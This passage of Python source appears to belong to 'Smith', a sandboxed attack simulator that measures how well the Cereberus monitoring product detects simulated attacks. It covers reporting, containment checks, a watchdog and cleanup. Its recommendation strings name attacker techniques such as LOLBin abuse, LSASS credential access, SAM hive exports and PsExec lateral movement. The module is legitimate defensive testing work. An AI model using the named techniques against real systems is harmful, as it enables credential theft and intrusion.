    def _check_detection(self, attack_id: str, category: str, description: str, fake_event: dict) -> dict:
        """Check if Cereberus detected the simulated attack.

        Evaluates the fake event against the rule engine and checks the
        alert manager for any matching recent alerts.

        Returns:
            dict with detected (bool), matches (list), and Smith commentary.
        """
        detected = False
        rule_matches: list[dict] = []

        # Test against rule engine
        if self._rule_engine is not None:
            try:
                matches = self._rule_engine.evaluate(fake_event)
                if matches:
                    detected = True
                    rule_matches = [
                        {
                            "rule_id": m.rule_id,
                            "rule_name": m.rule_name,
                            "severity": m.severity,
                            "category": m.category,
                            "explanation": m.explanation,
                        }
                        for m in matches
                    ]
            except Exception as exc:
                logger.error("smith_detection_check_error", error=str(exc), attack_id=attack_id)

        # Check alert manager for recent alerts that might correspond
        alert_matches: list[dict] = []
        if self._alert_manager is not None:
            try:
                recent = self._alert_manager.get_recent_alerts(limit=20)
                for alert in recent:
                    details = alert.get("details") or {}
                    if details.get("_smith_simulation") or details.get("_smith_attack_id") == attack_id:
                        alert_matches.append({
                            "title": alert.get("title", ""),
                            "severity": alert.get("severity", ""),
                        })
                        detected = True
            except Exception:
                pass

        commentary = _SMITH_QUOTES["detected"] if detected else _SMITH_QUOTES["missed"]

        return {
            "detected": detected,
            "rule_matches": rule_matches,
            "alert_matches": alert_matches,
            "match_count": len(rule_matches) + len(alert_matches),
            "commentary": commentary,
        }

    # ------------------------------------------------------------------
    # Results reporting
    # ------------------------------------------------------------------

    def _generate_results_report(self) -> dict:
        """Compile comprehensive session results report."""
        session_id = self._session_id or "unknown"
        now = datetime.now(timezone.utc).isoformat()

        total_attacks = len(self._current_attacks)
        detected_count = sum(
            1 for a in self._current_attacks
            if a.get("detection", {}).get("detected", False)
        )

        detection_rate = detected_count / total_attacks if total_attacks > 0 else 0.0
        verdict = _verdict(detection_rate)

        # Per-category breakdown
        category_results: dict[str, dict] = {}
        for attack in self._current_attacks:
            cat = attack.get("category", "unknown")
            if cat not in category_results:
                category_results[cat] = {"total": 0, "detected": 0, "attacks": []}
            category_results[cat]["total"] += 1
            if attack.get("detection", {}).get("detected", False):
                category_results[cat]["detected"] += 1
            category_results[cat]["attacks"].append({
                "attack_id": attack.get("attack_id"),
                "description": attack.get("description"),
                "detected": attack.get("detection", {}).get("detected", False),
                "rule_matches": attack.get("detection", {}).get("rule_matches", []),
            })

        for cat_data in category_results.values():
            cat_total = cat_data["total"]
            cat_data["detection_rate"] = cat_data["detected"] / cat_total if cat_total > 0 else 0.0

        # Identify weaknesses
        weak_categories = [
            cat for cat, data in category_results.items()
            if data["detection_rate"] < 0.5
        ]
        blind_spots = [
            cat for cat, data in category_results.items()
            if data["detection_rate"] == 0.0 and data["total"] > 0
        ]

        # Recommendations
        recommendations: list[str] = []
        if "malware_process" in blind_spots:
            recommendations.append("Enable or tune process-based detection rules for known malware families.")
        if "c2_beaconing" in blind_spots:
            recommendations.append("Improve C2 beaconing detection: look for periodic connection patterns and known C2 tool signatures.")
        if "ransomware" in blind_spots:
            recommendations.append("Add ransomware-specific rules: shadow copy deletion, mass file renames, boot recovery disabling.")
        if "lolbin_abuse" in blind_spots:
            recommendations.append("Enhance LOLBin detection coverage: certutil, mshta, regsvr32, rundll32 abuse patterns.")
        if "credential_dump" in blind_spots:
            recommendations.append("Strengthen credential access detection: LSASS access, SAM hive exports, known credential tools.")
        if "lateral_movement" in blind_spots:
            recommendations.append("Improve lateral movement detection: PsExec, WMI remote execution, remote scheduled tasks.")
        if "exfiltration" in blind_spots:
            recommendations.append("Add exfiltration detection: large outbound transfers, DNS tunneling, upload patterns.")
        if not recommendations and detection_rate < 1.0:
            recommendations.append("Consider lowering detection thresholds or adding additional rule coverage for partially-missed categories.")
        if detection_rate >= 1.0:
            recommendations.append("Detection coverage is complete. Consider testing at higher intensity levels for stress testing.")

        elapsed = None
        if self._session_start:
            elapsed = (datetime.now(timezone.utc) - self._session_start).total_seconds()

        return {
            "session_id": session_id,
            "timestamp": now,
            "intensity": self._intensity,
            "categories_tested": self._session_categories,
            "duration_seconds": elapsed,
            "total_attacks": total_attacks,
            "detected_count": detected_count,
            "missed_count": total_attacks - detected_count,
            "detection_rate": round(detection_rate, 4),
            "verdict": verdict,
            "category_results": category_results,
            "weak_categories": weak_categories,
            "blind_spots": blind_spots,
            "recommendations": recommendations,
            "_smith_simulation": True,
        }

    # ------------------------------------------------------------------
    # Safety invariants
    # ------------------------------------------------------------------

    def _check_invariants(self) -> None:
        """Validate all containment invariants before each attack.

        Raises SmithContainmentBreach if any invariant is violated.
        """
        if not self._active:
            raise SmithContainmentBreach("Session not active")

        # Time limit check
        if self._session_start:
            elapsed = (datetime.now(timezone.utc) - self._session_start).total_seconds()
            if elapsed > self._ABSOLUTE_MAX_DURATION:
                raise SmithContainmentBreach(
                    f"Session exceeded maximum duration: {elapsed:.0f}s > {self._ABSOLUTE_MAX_DURATION}s"
                )

        # Event count check
        if self._events_injected >= self._ABSOLUTE_MAX_EVENTS:
            raise SmithContainmentBreach(
                f"Maximum event count reached: {self._events_injected} >= {self._ABSOLUTE_MAX_EVENTS}"
            )

        # Sandbox directory check
        if not self._sandbox_dir.exists():
            raise SmithContainmentBreach(f"Sandbox directory missing: {self._sandbox_dir}")

    def _validate_sandbox_path(self, path: str) -> bool:
        """Ensure a path is strictly within the sandbox directory.

        Args:
            path: The path to validate.

        Returns:
            True if the path is within the sandbox, False otherwise.
        """
        try:
            resolved = Path(path).resolve()
            sandbox_resolved = self._sandbox_dir.resolve()
            return str(resolved).startswith(str(sandbox_resolved))
        except (ValueError, OSError):
            return False

    # ------------------------------------------------------------------
    # Watchdog
    # ------------------------------------------------------------------

    async def _watchdog(self) -> None:
        """Kill session if no progress for WATCHDOG_TIMEOUT seconds."""
        try:
            while self._active:
                await asyncio.sleep(5)

                if not self._active:
                    break

                now = asyncio.get_event_loop().time()
                idle_time = now - self._last_progress

                if idle_time > self._WATCHDOG_TIMEOUT:
                    logger.warning(
                        "smith_watchdog_triggered",
                        idle_seconds=idle_time,
                        session_id=self._session_id,
                    )

                    # Force kill the session task
                    if self._session_task and not self._session_task.done():
                        self._session_task.cancel()
                        try:
                            await self._session_task
                        except (asyncio.CancelledError, Exception):
                            pass

                    # Generate results and cleanup
                    report = self._generate_results_report()
                    await self._cleanup()

                    self._active = False
                    old_session = self._session_id
                    self._session_id = None
                    self._session_start = None
                    self._session_task = None
                    self.health_status = "standby"

                    self._results.appendleft(report)
                    logger.info(
                        "smith_watchdog_killed_session",
                        session_id=old_session,
                        message=_SMITH_QUOTES["watchdog"],
                    )
                    break

                # Also enforce time limit via watchdog
                if self._session_start:
                    elapsed = (datetime.now(timezone.utc) - self._session_start).total_seconds()
                    if elapsed > self._ABSOLUTE_MAX_DURATION:
                        logger.warning("smith_watchdog_timeout", elapsed=elapsed)
                        if self._session_task and not self._session_task.done():
                            self._session_task.cancel()
                            try:
                                await self._session_task
                            except (asyncio.CancelledError, Exception):
                                pass

                        report = self._generate_results_report()
                        await self._cleanup()

                        self._active = False
                        old_session = self._session_id
                        self._session_id = None
                        self._session_start = None
                        self._session_task = None
                        self.health_status = "standby"

                        self._results.appendleft(report)
                        logger.info(
                            "smith_timeout_killed_session",
                            session_id=old_session,
                            message=_SMITH_QUOTES["timeout"],
                        )
                        break

        except asyncio.CancelledError:
            pass

    # ------------------------------------------------------------------
    # Cleanup
    # ------------------------------------------------------------------

    async def _cleanup(self) -> None:
        """Remove ALL injected data from all modules and clear sandbox.

        This is the critical safety net -- ensures no simulated data
        persists in any module after a session ends.
        """
        session_id = self._session_id or "cleanup"
        logger.info("smith_cleanup_start", session_id=session_id)

        # Clean simulated processes from process analyzer
        if self._process_analyzer is not None and hasattr(self._process_analyzer, "_simulated_processes"):
            removed = len(self._process_analyzer._simulated_processes)
            self._process_analyzer._simulated_processes.clear()
            logger.info("smith_cleaned_processes", removed=removed)

        # Clean simulated connections from network sentinel
        if self._network_sentinel is not None and hasattr(self._network_sentinel, "_simulated_connections"):
            removed = len(self._network_sentinel._simulated_connections)
            self._network_sentinel._simulated_connections.clear()
            logger.info("smith_cleaned_connections", removed=removed)

        # Clean sandbox filesystem
        if self._sandbox_dir.exists():
            try:
                # Remove all contents but keep the directory
                for item in self._sandbox_dir.iterdir():
                    if item.is_dir():
                        shutil.rmtree(item, ignore_errors=True)
                    elif item.is_file():
                        item.unlink(missing_ok=True)
                logger.info("smith_cleaned_sandbox", path=str(self._sandbox_dir))
            except Exception as exc:
                logger.error("smith_sandbox_cleanup_error", error=str(exc))

        # Clear current session attack data
        self._current_attacks.clear()
        self._events_injected = 0

        logger.info("smith_cleanup_complete", session_id=session_id)

    # ------------------------------------------------------------------
    # Incident check
    # ------------------------------------------------------------------

    async def _has_active_incidents(self) -> bool:
        """Check if there are active real incidents that should block simulation."""
        if self._incident_manager is None:
            return False

        try:
            # Check for open or investigating incidents
            for status in ("open", "investigating", "contained"):
                incidents = await self._incident_manager.list_incidents(status=status, limit=1)
                if incidents:
                    return True
        except Exception as exc:
            logger.error("smith_incident_check_error", error=str(exc))
            # Fail safe -- if we cannot check, assume incidents exist
            return True

        return False
